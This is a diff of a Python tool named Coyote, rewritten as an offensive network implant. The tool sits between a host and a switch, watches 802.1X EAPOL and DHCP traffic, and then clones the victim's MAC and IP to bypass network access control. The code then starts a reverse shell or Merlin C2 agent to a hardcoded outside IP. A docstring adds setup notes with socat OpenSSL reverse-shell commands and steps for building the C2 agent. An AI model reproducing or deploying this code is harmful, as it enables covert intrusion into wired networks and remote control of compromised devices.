@@ -1,244 +1,271 @@
-# coding=utf-8
-
-from sys import exit
-from pytun import *
-from scapy.all import *
-from MANGLE import *
-from CoyoteFangs import *
-from Autoconf import *
+import os
 import socket
-import select
-import time
-from struct import *
-from binascii import hexlify,unhexlify
+import subprocess
+from subprocess import call
+from subprocess import Popen, PIPE
+from scapy.all import *
+from scapy.layers.inet import IP
+from scapy.layers.l2 import Ether
+from scapy.layers.eap import EAP
+from scapy.layers.dhcp import DHCP
 
-class Coyote:
 
-	def __init__(self):
-		if os.geteuid() != 0:
-			exit("You need root privileges to play with sockets !")	
-		self.isRunning = False
-		self.tap = None
-		self.s = None
-		self.MANGLE = None
-		self.hostip = '10.0.0.5'
-		#self.hostmac = '\x5c\x26\x0a\x13\x77\x8a'
-		self.hostmac = ''
-		#self.hostmac = '\x00\x1d\xe6\xd8\x6f\x02'
-		#self.hostmacStr = '5c:26:0a:13:77:8a'
-		self.hostmacStr = ''
-		#self.hostmacStr = "00:1d:e6:d8:6f:02"
-		self.verbosity = 3
-		self.scksnd1 = None
-		self.scksnd2 = None
-		self.Autoconf = Autoconf()
-		self.CoyoteFangs = CoyoteFangs(self.verbosity) #CoyoteFangs instance
-		self.pktsCount = 0
-		self.LhostIface = 'eth0'
-		self.switchIface = 'eth1'
+"""
 
-	def createTap(self):
-		self.tap = TunTapDevice(flags=IFF_TAP, name='Coyote')
-		self.tap.addr = "192.168.1.150"
-		self.tap.netmask = '255.0.0.0'
-		self.tap.mtu = 1500
-		self.tap.hwaddr = b'\x00\x11\x22\x33\x44\x55'
-		self.hwaddrStr = "00:11:22:33:44:55"
-		self.tap.persist(True)
-		self.tap.up()
+# To remove DHCP service on attacking machine
+update-rc.d -f dhcpd remove
 
-	def downTap(self):
-		if self.tap != None:
-			self.tap.down()
+# Set static IP's on the two interfaces
+nano /etc/network/interfaces
 
-	def bindAllIface(self):
-		self.s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+# make sure old interface configs are deleted from /etc/network/interfaces
 
-	def setAttribute(self, attributeName, attributeValue):
-		if attributeName == "host_ip":
-			self.hostip = attributeValue
-		elif attributeName == "host_mac":
-			self.hostmac = attributeValue
-			tempStr = hexlify(attributeValue).decode('ascii')
-			self.hostmacStr = tempStr[:2] + ":" + tempStr[2:4] + ":" + tempStr[4:6] + ":" + tempStr[6:8] + ":" + tempStr[8:10] + ":" + tempStr[-2:]
-		elif attributeName == "verbosity":
-			if attributeValue >= 0 and attributeValue <= 3:
-				self.verbosity = attributeValue
-				self.CoyoteFangs.changeVerbosity(self.verbosity)
-			else:
-				return False
-		elif attributeName == "netIface":
-			self.switchIface = str(attributeValue)
-			self.Autoconf.sockNetwork = self.switchIface
-		elif attributeName == "hostIface":
-			self.LhostIface = str(attributeValue)
-			self.Autoconf.ifaceHost = self.LhostIface
-		else:
-			return False
+# Make sure DNS is set in /etc/resolv.conf
 
-	def chooseIface(self,pkt) :
-		if pkt[Ether].dst == self.hwaddrStr:
-			print("Coyote NIC")
-			return 'Coyote'
-		elif pkt[Ether].dst == self.hostmacStr or ((pkt[Ether].dst == 'ff:ff:ff:ff:ff:ff' or pkt[Ether].dst == '01:80:c2:00:00:03') and pkt[Ether].src != self.hostmacStr):
-			print(str(pkt[Ether].dst) + " Host NIC")
-			return self.LhostIface
-		else:
-			print("Switch NIC")
-			return self.switchIface
+# Reverse Shell:
+On attacking server:
+    openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
+    cat shell.key shell.crt > shell.pem
+    openssl dhparam -out dhparams.pem 2048
+    cat dhparams.pem >> shell.pem
+    
+    socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0 STDOUT
+    
+    To Interact:
+        Login to attacking server
+        screen -x
+        screen -x PID
+        ctrl + A and then ctrl + D will soft exit, so you can re-use later
+        
+    Merlin-C2 Server:
+        Just follow git instructions on copying, unzipping and running binary
+    
+On MITM Device:
+    socat OPENSSL:44.241.183.149:443,verify=0 EXEC:/bin/bash
+    
+    MERLIN-C2 Agent:
+        Make sure to use golang version 16 to compile the agent
+    
+        compile agent for Arm64 and Linux OS
+            GOOS=linux GOARCH=arm64 /usr/local/go/bin/go build
+        Transfer agent to host and run
+             ./merlin-agent -url https://<IP of C2>
+             
+        From this agent we can kick off socat connections back to the C2 to get more interactive when need be
 
-	# Handles sending mangled traffic
-	def sendeth2(self, raw, interface):
-		self.scksnd1 = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-		self.scksnd2 = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-		self.scksnd1.bind((self.LhostIface, 0))
-		self.scksnd2.bind((self.switchIface, 0))
-		if interface == self.LhostIface:
-			# This is a dirty hotfix for the fragmentation problem; will be fixed later
-			try:
-				self.scksnd1.send(raw)
-			except:
-				pass
-		else:
-			try:
-				self.scksnd2.send(raw)
-			except:
-				pass
-		return
 
-	def initAutoconf(self):
-		self.hostip, self.hostmacStr = self.Autoconf.startAutoconf()
-		self.hostmac = self.strToHex(self.hostmacStr)
-		self.macstr = self.strToHex(self.hostmacStr)  # Set macstr hex value from captured mac string
-		print('MAC IS SET: ' + self.hostmacStr)
+"""
 
-	def strToHex(self, string):
-		hexes = string.split(":")
-		hexstr = ''.join(hexes).encode("ascii")
-		return unhexlify(hexstr)
 
-	def initMANGLE(self, stop_event):
-		self.bindAllIface()
-		inputs = [self.s, self.tap]
-		last_mangled_request = []
-		mycount = 1 ## DECOMISSIONNED
-		self.MANGLE = MANGLE(self.hostip, self.tap.addr, self.hostmacStr, self.hwaddrStr, self.verbosity)  # MANGLE instance init # ip host, ip rogue, mac host, mac rogue
-		while not stop_event.is_set():
-			try:
-				inputready,outputready,exceptready = select.select(inputs, [], [])
-			except select.error as e:
-				break
-			except socket.error as e:
-				break
 
-			for socketReady in inputready :
-				roundstart_time = time.time()
-				### FROM NETWORK ###
-				if socketReady == self.s :
-					packet = self.s.recvfrom(1600)
-					raw_pkt = packet[0]
-					if raw_pkt not in last_mangled_request: # pour éviter le sniff de paquets déjà traités (to avoid sniffing packets that have already been processed)
-						self.pktsCount += 1
-						pkt = Ether(packet[0])
-						if self.CoyoteFangs.checkRules(pkt) == True:
-							if 'IP' in pkt and pkt[IP].dst != '224.0.0.252' and pkt[IP].dst != '10.0.0.255':
-								self.MANGLE.pktRewriter(pkt, pkt[IP].src, self.MANGLE.rogue, pkt[Ether].src, self.MANGLE.mrogue)
-							last_mangled_request.append(bytes(pkt))
-							#print("PKT in rules")
-							
-							self.tap.write(bytes(pkt))
-							break
-						elif 'ARP' in pkt and (pkt[Ether].src == self.tap.hwaddr or pkt[ARP].pdst == self.hostip or pkt[ARP].psrc == self.hostip) :		
-							epkt = pkt
-						elif 'IP' in pkt and (pkt[Ether].src == self.tap.hwaddr or pkt[IP].dst == self.hostip or pkt[IP].src == self.hostip or pkt[IP].dst == '224.0.0.252') :
-							epkt = pkt
-						elif 'EAPOL' in pkt:
-							epkt = pkt
-						elif 'BOOTP' in pkt:
-							epkt = pkt
-						else:
-							break
-		##### NBT-NS
-						if not mycount and 'IP' in epkt and (epkt[IP].dst == '10.0.0.255' and epkt[IP].dport == 137) :
-							print("---------- UDP Packet NBT-NS")
-							last_mangled_request.append(raw(epkt))
-							self.tap.write(raw(epkt))
-		##### LLMNR
-						elif not mycount and 'IP' in epkt and (epkt[IP].dst == '224.0.0.252' and epkt[IP].dport == 5355) :
-							print("---------- UDP Packet LLMNR")
-							last_mangled_request.append(raw(epkt))
-							self.tap.write(raw(epkt))
-		##### fin LLMNR / NBNS
-						elif not mycount and 'IP' in epkt and epkt[IP].dport == 445:
-							print("IN MY IF-2")
-							MANGLE.pktRewriter(epkt, epkt[IP].src, MANGLE.rogue, epkt[Ether].src, MANGLE.mrogue)
-							last_mangled_request.append(raw(epkt))
-							self.tap.write(raw(epkt))
-						else :
-							mangled_request = self.MANGLE.Coyote_Address_Translation(epkt)
-							ifaceToBeUsed = self.chooseIface(mangled_request)
-							if ifaceToBeUsed == 'Coyote':
-								self.tap.write(raw(mangled_request))
-							else:
-								#mangled_request.show2()
-								last_mangled_request.append(raw(mangled_request))
-								self.sendeth2(raw(mangled_request), ifaceToBeUsed)
-					else :
-						last_mangled_request.remove(raw_pkt)
-				### FROM Coyote ###
-				elif socketReady == self.tap:
-					self.pktsCount += 1
-					buf = self.tap.read(self.tap.mtu)  # test paquet depuis Rogue
-					epkt = Ether(buf)  # idem que au dessus
-					if epkt not in last_mangled_request:
-						mangled_request = self.MANGLE.Coyote_Address_Translation(epkt)
-						ifaceToBeUsed = self.chooseIface(mangled_request)
+class Coyote():
 
-		########### debut LLMNR
-						#print str(mangled_request.summary()) + " ----------- IN tap socket loop (after MANGLE)" 
-						if 'LLMNRQuery' in mangled_request : 
-							print("IN")
-							mangled_request[LLMNRQuery].an.rdata = '10.0.0.5'
-							del mangled_request[IP].chksum
-							if 'UDP' in mangled_request:
-								del mangled_request[UDP].chksum
-							mangled_request = mangled_request.__class__(raw(mangled_request))
-							#ls(mangled_request)
-		########### fin LLMNR
-						#print(ifaceToBeUsed)
-						if ifaceToBeUsed == 'Coyote':
-							self.tap.write(raw(mangled_request))
-							last_mangled_request.append(mangled_request)
-						else :
-							#mangled_request.show2()
-							###
-							if 'IP' in mangled_request and 1 == 2:
-								print("before frag")
-								frags=fragment(mangled_request, fragsize=500)
-								print("after frags")
-								for frag in frags:
-									frag = frag.__class__(raw(frag))
-									last_mangled_request.append(raw(frag))
-									self.sendeth2(raw(frag), ifaceToBeUsed)
-									#send(frag, iface=ifaceToBeUsed)
-							else:
-								if 'IP' in mangled_request:
-									del mangled_request[IP].len
-								#mangled_request = mangled_request.__class__(str(mangled_request))
-								#if 'TCP' in mangled_request:
-								#	new_mangled_request = self.MANGLE.changeSessID(mangled_request)
-								#	mangled_request = new_mangled_request
-								last_mangled_request.append(str(mangled_request))
-								#if 'TCP' in mangled_request:
-								#	#print("[[[")
-								#	print(str(mangled_request[TCP].seq) + " : " + str(mangled_request[IP].len))
-								#	print("]]]")
-								self.sendeth2(raw(mangled_request), ifaceToBeUsed)
-							###
-					#	last_mangled_request.append(str(mangled_request))
-					#	self.sendeth2(str(mangled_request), ifaceToBeUsed)
-					else:
-						self.tap.write(raw(epkt))
-						last_mangled_request.remove(epkt)
-				else :
-					exit('WTH')
+    def __init__(self):
+        self.config = self.fetchConfig()  # Parse config file
+        self.sockHost = ""
+        self.sockNetwork = ""
+        self.ifaceHost = "eth0"
+        self.ifaceNetwork = "eth1"
+        self.hostMAC = ""
+        self.hostIP = ""
+        self.hostMASK = ""
+        self.hostGW = ""
+        self.hostDNS = ""
+        self.packetCounter = 0
+        self.eapolPacketCounter = 0
+        self.eapolSuccess = False
+        self.trigger = False  # Tracks when MAC and IP are set from auto-search
+        self.dhcp = False  # Tracks when DHCP ACK has been sent, signifying a successful DHCP request process
+        self.dhcpICMP = False  # Trigger for ICMP packet sent post DHCP assignment
+        self.countdown = 0  # Begins packet countdown DHCP assignment. Ensures DHCP has officially wrapped up on host
+        self.ignoreHost = False
+        self.ssh_host = self.config['ssh_host']
+        self.ssh_local_host = self.config['ssh_local_host']
+        self.ssh_port = self.config['ssh_port']
+        self.ssh_user = self.config['ssh_username']
+        self.ssh_key = self.config['ssh_key']
+
+    def fetchConfig(self):  # Fetch Config File Parameters into array
+        configuration_items = {}  # config array
+        config = open("config.txt", "r")
+        config = config.read()
+        config = config.split('\n')
+        for item in config:
+            if "#" not in item and item != "":  # Ignore Comments and empty spaces
+                item = item.split("=")
+                configuration_items[item[0]] = item[1]
+
+        return configuration_items
+
+    def mitm(self):
+
+        self.setSystemSettings()  # Config interfaces
+        self.sockHost = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+        self.sockNetwork = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
+
+        try:
+            self.sockHost.bind((self.ifaceHost, 0))
+            self.sockNetwork.bind((self.ifaceNetwork, 0))
+        except:
+            print("=> You need 2 physical network interfaces to use Coyote!")
+
+        self.inputs = [self.sockHost, self.sockNetwork]
+
+        while True:
+            try:
+                inputready, outputready, exceptready = select.select(self.inputs, [], [])
+            except select.error as e:
+                break
+            except socket.error as e:
+                break
+            for socketReady in inputready:
+                # We check packets from iface1 and fwd them to iface2
+                if socketReady == self.sockHost:
+                    packet = self.sockHost.recvfrom(4096)  # Buffer needed to be extended to avoid fragmentation
+                    pkt = packet[0]
+                    dpkt = Ether(packet[0])
+
+                    inspection = self.packetInspector(packet)   # Packet Inspector
+                    if inspection:
+
+                        if self.eapolSuccess and self.dhcp:
+
+                            if 'ICMP' in dpkt:  # Check if ICMP pak has been sent post successful DHCP allocation
+                                self.dhcpICMP = True
+
+                            if self.dhcpICMP:  # If ICMP has been sent, begin countdown before NIC emulation
+                                self.countdown += 1
+                                if self.countdown >= 50:
+                                    self.emulate()
+                                    # Reset variables in case DHCP process repeats
+                                    self.dhcp = False
+                                    self.dhcpICMP = False
+                                    self.countdown = 0
+
+                        # Send the packet to the other interface
+                        try:
+                            self.sockNetwork.send(pkt)
+                        except:
+                            pass
+
+                # Forward packet from iface2 to iface1
+                if socketReady == self.sockNetwork:
+                    packet = self.sockNetwork.recvfrom(4096)
+                    pkt = packet[0]
+                    dpkt = Ether(packet[0])
+
+                    inspection = self.packetInspector(packet)  # Packet Inspector
+                    if inspection:
+                        if 'IP' in dpkt and (self.ignoreHost is True and dpkt[IP].src == self.ssh_host):  # Don't send packets back to host if the Coyote host is trying to talk to C2
+                            pass
+                        else:
+                            try:
+                                self.sockHost.send(pkt)
+                            except Exception as error:
+                                pass
+
+    def packetInspector(self, packet):
+
+        self.packetCounter += 1  # Iterate packet counter
+
+        pkt = packet[0]
+        dpkt = Ether(packet[0])
+
+        if dpkt[Ether].src != "e4:5f:01:5a:31:10" and dpkt[Ether].src != "00:e0:4c:68:20:d8" and dpkt[Ether].src != "a0:ce:c8:19:b4:95":
+
+            if 'EAPOL' in Ether(pkt):
+                print("=> EAPOL packet")
+
+                self.ignoreHost = False  # Start transmitting to host again
+
+                # parse EAPOL for Success Message
+                eapol = bytes(EAP(pkt))
+                response = eapol[18:19]  #  EAPOL response - x03 for SUCCESS
+
+                if response == b'\x03':  # If EAPOL returns a x03 and indicates successful authentication
+                    print("[+] EAPOL SUCCEEDED! Fetching HOST Info from DHCP")
+                    self.eapolSuccess = True
+
+                self.eapolPacketCounter += 1
+
+            if 'DHCP' in Ether(pkt) and 'ICMP' not in Ether(pkt):
+                print("=> DHCP Packet")
+                if dpkt.getlayer(DHCP).fields['options'][0][1] == 5:
+                    print("=> DHCP ACK Found")
+                    self.hostIP = dpkt[IP].dst
+                    self.hostMAC = dpkt[Ether].dst
+                    self.hostGW = self.get_dhcp_option(dpkt.getlayer(DHCP).fields['options'], 'router')
+                    self.hostDNS = self.get_dhcp_option(dpkt.getlayer(DHCP).fields['options'], 'name_server')
+                    self.hostMASK = self.get_dhcp_option(dpkt.getlayer(DHCP).fields['options'], 'subnet_mask')
+                    print("[+] Host GW: " + str(self.hostGW))
+                    print("[+] Host DNS: " + str(self.hostDNS))
+                    print("[+] Host IP: " + str(self.hostIP))
+                    print("[+] Host MAC: " + str(self.hostMAC))
+                    self.dhcp = True
+
+                return True
+
+            return True
+
+        else:
+            print("Dropped Frame")
+            return False
+
+    def emulate(self):
+        print("[+] Emulation has Begun!")
+        call(["ifconfig", "eth0", "172.16.71.100", "netmask", "255.255.255.255", "broadcast", "192.168.1.255"])
+        call(["ifconfig", "eth1", self.hostIP, "netmask", self.hostMASK])
+        # TODO Need to set DNS automatically -- difficult as it requires a network reset
+        call(["ifconfig", "eth1", "down"])
+        call(["ifconfig", "eth1", "hw", "ether", self.hostMAC])
+        call(["ifconfig", "eth1", "up"])
+        time.sleep(8)  # Int may need to manipulated depending on attacking system cpu speed
+        print("[+] Emulation Configured")
+        print("[+] Adding Default Route")
+        os.system("route add default gw " + self.hostGW + " eth1")
+
+        self.ignoreHost = True  # Stop transmitting to host
+
+        print("[+] Starting Reverse Shell")
+        CoyoteThread = threading.Thread(target=self.revShell, args=())
+        CoyoteThread.daemon = True
+        CoyoteThread.start()
+
+    def setSystemSettings(self):  # Configure requirements
+        subprocess.run(["sysctl", "net.ipv4.ipforward=1"])
+        subprocess.run(["ifconfig", "eth0", "promisc"])
+        subprocess.run(["ifconfig", "eth1", "promisc"])
+
+    # Extract dhcp_options by key
+    def get_dhcp_option(self, dhcp_options, key):
+
+        must_decode = ['hostname', 'domain', 'vendor_class_id']
+        try:
+            for i in dhcp_options:
+                if i[0] == key:
+                    # If DHCP Server Returned multiple name servers
+                    # return all as comma separated string.
+                    if key == 'name_server' and len(i) > 2:
+                        return ",".join(i[1:])
+                    # domain and hostname are binary strings,
+                    # decode to unicode string before returning
+                    elif key in must_decode:
+                        return i[1].decode()
+                    else:
+                        return i[1]
+        except:
+            pass
+
+    def revShell(self):
+
+        try:
+            #shell = subprocess.Popen(["socat", "OPENSSL:34.213.220.227:443,verify=0", "EXEC:/bin/bash"], stdin=PIPE, stdout=PIPE)
+            shell = os.system("cd /mnt/win_share/Coyote && ./merlin-agent -url https://34.213.220.227")
+            print("    [+] Reverse Shell Established. Enjoy!")
+        except Exception as err:
+            print("[+] Reverse Shell Failed -> " + str(err))
+
+
+if __name__ == '__main__':
+    run = Coyote()
+    run.mitm()
